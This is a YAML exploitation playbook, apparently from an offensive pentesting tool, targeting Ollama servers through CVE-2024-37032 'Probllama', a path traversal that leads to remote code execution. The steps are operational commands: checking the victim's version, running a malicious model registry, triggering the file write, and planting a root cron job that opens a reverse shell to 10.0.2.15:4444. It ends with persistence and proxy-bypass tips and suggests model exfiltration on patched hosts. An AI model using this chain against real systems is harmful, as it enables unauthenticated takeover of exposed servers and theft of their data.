chain_id: ollama_cve_2024_37032_probllama
title: "Ollama — CVE-2024-37032 'Probllama' /api/pull path traversal → RCE"
severity: CRITICAL
tags: [ollama, llm, ai, cve-2024-37032, probllama, path-traversal, rce, unauth]

trigger:
  any_of:
    - { kind: "CVE-2024-37032" }
    - { product_pattern: "(?i)ollama" }
    - { banner_pattern: "(?i)ollama" }
    - { port_in: [11434], path_pattern: "(?i)/api/(pull|push|create)" }

description: |
  Ollama < 0.1.34 trusts the manifest digest path inside `POST
  /api/pull`. A malicious manifest containing `..` segments lets
  an unauthenticated attacker write arbitrary files outside the
  models directory — including `/usr/bin/ollama` itself, or
  `/etc/ld.so.preload`, or the systemd unit. Default Ollama
  install binds to 0.0.0.0:11434 with no auth, and tens of
  thousands were exposed when Wiz Research disclosed it
  (May 2024).

steps:
  - id: 1
    title: "Confirm the API is open and the version is vulnerable"
    command: |
      curl -s "http://$VICTIMA:11434/api/version"
      curl -s "http://$VICTIMA:11434/api/tags" | head -20

  - id: 2
    title: "Public PoC — host a malicious model registry"
    command: |
      git clone https://github.com/wiz-research/Ollama-CVE-2024-37032-PoC /tmp/probllama
      cd /tmp/probllama
      python3 server.py --listen 0.0.0.0 --port 8000 --target-write /tmp/pwned

  - id: 3
    title: "Trigger pull from victim → file write"
    command: |
      curl -s "http://$VICTIMA:11434/api/pull" -X POST \
        -d '{"name":"10.0.2.15:8000/library/evil:latest","stream":false}'
      # Then SSH in or trigger the dropped binary; verify with:
      ls -l /tmp/pwned

  - id: 4
    title: "RCE — overwrite a binary the host runs as root"
    command: |
      python3 server.py --target-write /etc/cron.d/ollama_pwn \
        --payload '* * * * * root bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
      curl -s "http://$VICTIMA:11434/api/pull" -X POST \
        -d '{"name":"10.0.2.15:8000/library/evil:latest","stream":false}'
      nc -lvnp 4444  # within ~60s

  - id: 5
    title: "Persistence — drop an Ollama Modelfile that runs on every load"
    command: |
      # Modelfile FROM directive supports arbitrary local paths post-write.
      # Combine with file-write to overwrite the active model and gain
      # exec on every `ollama run` call from a legitimate user.

common_errors:
  - error: "/api/pull returns 404"
    solution: |
      Behind nginx/traefik with path stripping. Try /ollama/api/pull
      and /v1/api/pull. Also check the OpenAI-compatible /v1 prefix
      that Ollama added in 0.1.30.
  - error: "version >= 0.1.34"
    solution: |
      Patched. Look instead at exposed unauth `/api/generate` for
      prompt-injection / model exfiltration, which is still
      authentication-free by default.

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-37032
  - https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032
